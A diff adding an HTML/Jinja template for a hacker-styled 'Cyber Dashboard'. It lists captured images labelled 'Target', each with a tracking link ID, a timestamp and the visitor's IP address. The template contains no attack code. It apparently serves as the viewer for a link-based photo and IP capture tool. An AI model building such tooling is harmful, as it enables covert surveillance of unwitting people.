@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cyber Dashboard</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        
+        body {
+            background-color: #000;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
+            margin: 0;
+            padding: 20px;
+        }
+        header {
+            border-bottom: 2px solid #00ff41;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 20px;
+        }
+        .card {
+            border: 1px solid #008F11;
+            padding: 10px;
+            background: rgba(0, 255, 65, 0.05);
+            position: relative;
+        }
+        .card::before {
+            content: "RECORDED";
+            position: absolute;
+            top: 5px; right: 5px;
+            font-size: 0.7em;
+            background: #00ff41;
+            color: #000;
+            padding: 2px 5px;
+        }
+        img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            filter: grayscale(20%) contrast(1.2);
+            border: 1px solid #333;
+        }
+        .info {
+            margin-top: 10px;
+            font-size: 0.8em;
+            color: #aaa;
+        }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+    <header>
+        <h2>// SYSTEM_LOGS</h2>
+        <span class="blink">● LIVE FEED</span>
+    </header>
+
+    <div class="grid-container">
+        {% for session in data %}
+            {% for img_info in session.images %}
+            <div class="card">
+                <img src="/uploads/{{ img_info.filename }}" alt="Target">
+                <div class="info">
+                    ID: {{ session.link_id }}<br>
+                    TIME: {{ img_info.timestamp }}<br>
+                    IP: {{ img_info.ip }}
+                </div>
+            </div>
+            {% endfor %}
+        {% endfor %}
+    </div>
+</body>
+</html>
